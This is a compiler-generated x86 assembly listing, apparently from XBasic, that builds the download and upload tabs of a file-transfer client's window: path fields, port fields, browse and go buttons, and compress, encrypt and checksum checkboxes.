; [1798] '#edit1 = NewChild ("edit", "block size (kb)", $$ES_NUMBER | $$ES_AUTOHSCROLL  | $$WS_BORDER, left+95, top+16+1, 90, 19, hwnd, 1234, 0)
;
; [1799] '#edit2 = NewChild ("edit", "password", $$ES_PASSWORD | $$ES_AUTOHSCROLL | $$WS_BORDER, left+95, top+16+19, 90, 19, hwnd, 1234, 0)
;
; [1800] '#edit3 = NewChild ("edit", "text ", $$ES_AUTOHSCROLL  | $$WS_BORDER, left+95, top+16+19+18, 90, 19, #download_tab, 1234, 0)
;
; [1801] '#text2 = NewChild ($$STATIC_CLASS,"remote port",$$BS_LEFTTEXT | $$BS_FLAT, left+112, top+18+24, 65, 19, hwnd, 1234, 0)
;
; [1802] '#edit5 = NewChild ("edit",STRING$($$FILE_DEFAULTPORT),$$ES_NUMBER | $$ES_AUTOHSCROLL  | $$WS_BORDER, left+182, top+18+24, 45, 19, hwnd, 1234, 0)
;
; [1804] ' download tab
;
; [1805] left = 5: top = 4: hwnd = #download_tab
#ifdef CreateWindows.left
#undef CreateWindows.left
#endif
#define CreateWindows.left ebp-88	; exposes local variable 'left'
;
	mov	eax,5			;;; i659
	mov	d[ebp-88],eax			;;; i670
#ifdef CreateWindows.top
#undef CreateWindows.top
#endif
#define CreateWindows.top ebp-92	; exposes local variable 'top'
;
	mov	eax,4			;;; i659
	mov	d[ebp-92],eax			;;; i670
#ifdef CreateWindows.hwnd
#undef CreateWindows.hwnd
#endif
#define CreateWindows.hwnd ebp-96	; exposes local variable 'hwnd'
;
	mov	eax,d[%#download_tab.client]			;;; i663a
	mov	d[ebp-96],eax			;;; i670
;
; [1806] #group3 = NewChild ("button","remote file", $$BS_GROUPBOX , left, top, w-25, 67, hwnd,0, 0)
data section 'globals$shared'
align	4
%#group3.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.040D.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,25			;;; i791
	mov	d[ebp-84],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-96]			;;; i674a
	push	67			;;; i656a
	push	[ebp-84]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	7			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#group3.client],eax			;;; i668
;
; [1807] #edit3 = NewChild ("edit","",$$ES_AUTOHSCROLL | $$WS_BORDER, left+5, top+18, w-65, 19, hwnd, $$DNL_path, 0)
data section 'globals$shared'
align	4
%#edit3.client:	db 4 dup ?
.code
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,128			;;; i659
	or	eax,8388608			;;; i763
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
; .xstk9.0003 = ebp-104	; internal variable
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,65			;;; i791
; .xstk9.0004 = ebp-112	; internal variable
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	502			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	0			;;; i665a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#edit3.client],eax			;;; i668
;
; [1808] #button1 = NewChild ("button","go",$$BS_USERBUTTON , w-52, top+18, 27, 20, hwnd, $$DNL_go, $$WS_EX_STATICEDGE)
data section 'globals$shared'
align	4
%#button1.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0415.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,52			;;; i791
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	131072			;;; i656a
	push	501			;;; i656a
	push	[ebp-96]			;;; i674a
	push	20			;;; i656a
	push	27			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	8			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#button1.client],eax			;;; i668
;
; [1809] #text1 = NewChild ($$STATIC_CLASS,"port",$$BS_LEFTTEXT | $$BS_FLAT, left+5, top+18+24, 55, 19, hwnd, 0, 0)
data section 'globals$shared'
align	4
%#text1.client:	db 4 dup ?
.code
	mov	eax,addr @_string.1B65.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.041B.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,32			;;; i659
	or	eax,32768			;;; i763
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	add	eax,24			;;; i775
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	55			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#text1.client],eax			;;; i668
;
; [1810] #edit4 = NewChild ("edit",STRING$($$FILE_DEFAULTPORT),$$ES_NUMBER | $$ES_AUTOHSCROLL | $$WS_BORDER, left+31, top+18+24, 45, 19, hwnd, $$DNL_port, 0)
data section 'globals$shared'
align	4
%#edit4.client:	db 4 dup ?
.code
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	sub	esp,64			;;; i487
	mov	d[esp],28010
	call	%_string.slong			;;; i576
	add	esp,64			;;; i600
	mov	[ebp-68],eax			;;; i670
	mov	eax,8192			;;; i659
	or	eax,128			;;; i763
	or	eax,8388608			;;; i763
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,31			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	add	eax,24			;;; i775
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	503			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	45			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#edit4.client],eax			;;; i668
;
; [1811] left = 5: top = 75
	mov	eax,5			;;; i659
	mov	d[ebp-88],eax			;;; i670
	mov	eax,75			;;; i659
	mov	d[ebp-92],eax			;;; i670
;
; [1812] #group6 = NewChild ("button","save as", $$BS_GROUPBOX , left, top, w-25, 45, hwnd,0, 0)
data section 'globals$shared'
align	4
%#group6.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0425.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,25			;;; i791
	mov	d[ebp-84],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-96]			;;; i674a
	push	45			;;; i656a
	push	[ebp-84]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	7			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#group6.client],eax			;;; i668
;
; [1813] #edit9 = NewChild ("edit","",$$ES_AUTOHSCROLL | $$WS_BORDER, left+5, top+18, w-88, 19, hwnd, $$DNL_path, 0)
data section 'globals$shared'
align	4
%#edit9.client:	db 4 dup ?
.code
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,128			;;; i659
	or	eax,8388608			;;; i763
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,88			;;; i791
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	502			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	0			;;; i665a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#edit9.client],eax			;;; i668
;
; [1814] #button2 = NewChild ("button","browse", $$BS_USERBUTTON,w-75, top+18, 50, 20, hwnd, $$DNL_browse, $$WS_EX_STATICEDGE)
data section 'globals$shared'
align	4
%#button2.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0429.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,75			;;; i791
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	131072			;;; i656a
	push	504			;;; i656a
	push	[ebp-96]			;;; i674a
	push	20			;;; i656a
	push	50			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	8			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#button2.client],eax			;;; i668
;
; [1815] left = 90: top = 30
	mov	eax,90			;;; i659
	mov	d[ebp-88],eax			;;; i670
	mov	eax,30			;;; i659
	mov	d[ebp-92],eax			;;; i670
;
; [1816] #check1 = NewChild ("button", "compress", $$BS_AUTOCHECKBOX , left+5, top+18, 75, 15, hwnd, 401, 0)
data section 'globals$shared'
align	4
%#check1.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.042E.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	401			;;; i656a
	push	[ebp-96]			;;; i674a
	push	15			;;; i656a
	push	75			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	3			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#check1.client],eax			;;; i668
;
; [1817] #check2 = NewChild ("button", "encrypt", $$BS_AUTOCHECKBOX , left+89, top+18, 60, 15, hwnd, 402, 0)
data section 'globals$shared'
align	4
%#check2.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0433.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,89			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	402			;;; i656a
	push	[ebp-96]			;;; i674a
	push	15			;;; i656a
	push	60			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	3			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#check2.client],eax			;;; i668
;
; [1818] #check3 = NewChild ("button", "adler crc", $$BS_AUTOCHECKBOX , left+88+69, top+18, 70, 15, hwnd, 403, 0)
data section 'globals$shared'
align	4
%#check3.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0438.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,88			;;; i775
	add	eax,69			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	403			;;; i656a
	push	[ebp-96]			;;; i674a
	push	15			;;; i656a
	push	70			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	3			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#check3.client],eax			;;; i668
;
; [1820] ' upload tab
;
; [1821] left = 5: top = 4: hwnd = #upload_tab
	mov	eax,5			;;; i659
	mov	d[ebp-88],eax			;;; i670
	mov	eax,4			;;; i659
	mov	d[ebp-92],eax			;;; i670
	mov	eax,d[%#upload_tab.client]			;;; i663a
	mov	d[ebp-96],eax			;;; i670
;
; [1822] #group4 = NewChild ("button","local file", $$BS_GROUPBOX, left, top, w-25, 67, hwnd, 0, 0)
data section 'globals$shared'
align	4
%#group4.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.043D.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,25			;;; i791
	mov	d[ebp-84],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-96]			;;; i674a
	push	67			;;; i656a
	push	[ebp-84]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	7			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#group4.client],eax			;;; i668
;
; [1823] #edit6 = NewChild ("edit","",$$ES_AUTOHSCROLL | $$WS_BORDER, left+5, top+18, w-88, 19, hwnd, $$UPL_path, 0)
data section 'globals$shared'
align	4
%#edit6.client:	db 4 dup ?
.code
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,128			;;; i659
	or	eax,8388608			;;; i763
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,88			;;; i791
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	512			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	0			;;; i665a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#edit6.client],eax			;;; i668
;
; [1824] #button4 = NewChild ("button","browse", $$BS_USERBUTTON,w-75, top+18, 50, 20, hwnd, $$UPL_browse, $$WS_EX_STATICEDGE)
data section 'globals$shared'
align	4
%#button4.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0429.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,75			;;; i791
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	131072			;;; i656a
	push	514			;;; i656a
	push	[ebp-96]			;;; i674a
	push	20			;;; i656a
	push	50			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	8			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#button4.client],eax			;;; i668
;
; [1825] #text3 = NewChild ($$STATIC_CLASS,"port",$$BS_LEFTTEXT | $$BS_FLAT, left+5, top+18+24, 55, 19, hwnd, 0, 0)
data section 'globals$shared'
align	4
%#text3.client:	db 4 dup ?
.code
	mov	eax,addr @_string.1B65.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.041B.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,32			;;; i659
	or	eax,32768			;;; i763
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	add	eax,24			;;; i775
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	55			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#text3.client],eax			;;; i668
;
; [1826] #edit7 = NewChild ("edit",STRING$($$FILE_DEFAULTPORT),$$ES_NUMBER | $$ES_AUTOHSCROLL | $$WS_BORDER, left+31, top+18+24, 45, 19, hwnd, $$UPL_port, 0)
data section 'globals$shared'
align	4
%#edit7.client:	db 4 dup ?
.code
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	sub	esp,64			;;; i487
	mov	d[esp],28010
	call	%_string.slong			;;; i576
	add	esp,64			;;; i600
	mov	[ebp-68],eax			;;; i670
	mov	eax,8192			;;; i659
	or	eax,128			;;; i763
	or	eax,8388608			;;; i763
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,31			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	add	eax,24			;;; i775
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	513			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	45			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#edit7.client],eax			;;; i668
;
; [1827] left = 5: top = 75
	mov	eax,5			;;; i659
	mov	d[ebp-88],eax			;;; i670
	mov	eax,75			;;; i659
	mov	d[ebp-92],eax			;;; i670
;
; [1828] #group7 = NewChild ("button","upload to", $$BS_GROUPBOX , left, top, w-25, 45, hwnd,0, 0)
data section 'globals$shared'
align	4
%#group7.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0443.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,25			;;; i791
	mov	d[ebp-84],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-96]			;;; i674a
	push	45			;;; i656a
	push	[ebp-84]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	7			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#group7.client],eax			;;; i668
;
; [1829] #edit10 = NewChild ("edit","",$$ES_AUTOHSCROLL | $$WS_BORDER, left+5, top+18, w-65, 19, hwnd, $$DNL_path, 0)
data section 'globals$shared'
align	4
%#edit10.client:	db 4 dup ?
.code
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,128			;;; i659
	or	eax,8388608			;;; i763
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,65			;;; i791
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	502			;;; i656a
	push	[ebp-96]			;;; i674a
	push	19			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	0			;;; i665a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#edit10.client],eax			;;; i668
;
; [1830] #button3 = NewChild ("button","go",$$BS_USERBUTTON , w-52, top+18, 27, 20, hwnd, $$UPL_go, $$WS_EX_STATICEDGE)
data section 'globals$shared'
align	4
%#button3.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0415.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,52			;;; i791
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	131072			;;; i656a
	push	511			;;; i656a
	push	[ebp-96]			;;; i674a
	push	20			;;; i656a
	push	27			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	8			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#button3.client],eax			;;; i668
;
; [1831] left = 90: top = 30
	mov	eax,90			;;; i659
	mov	d[ebp-88],eax			;;; i670
	mov	eax,30			;;; i659
	mov	d[ebp-92],eax			;;; i670
;
; [1832] #check4 = NewChild ("button", "compress", $$BS_AUTOCHECKBOX , left+5, top+18, 75, 15, hwnd, 404, 0)
data section 'globals$shared'
align	4
%#check4.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.042E.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,5			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	404			;;; i656a
	push	[ebp-96]			;;; i674a
	push	15			;;; i656a
	push	75			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	3			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#check4.client],eax			;;; i668
;
; [1833] #check5 = NewChild ("button", "encrypt", $$BS_AUTOCHECKBOX , left+89, top+18, 60, 15, hwnd, 405, 0)
data section 'globals$shared'
align	4
%#check5.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0433.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,89			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	405			;;; i656a
	push	[ebp-96]			;;; i674a
	push	15			;;; i656a
	push	60			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	3			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#check5.client],eax			;;; i668
;
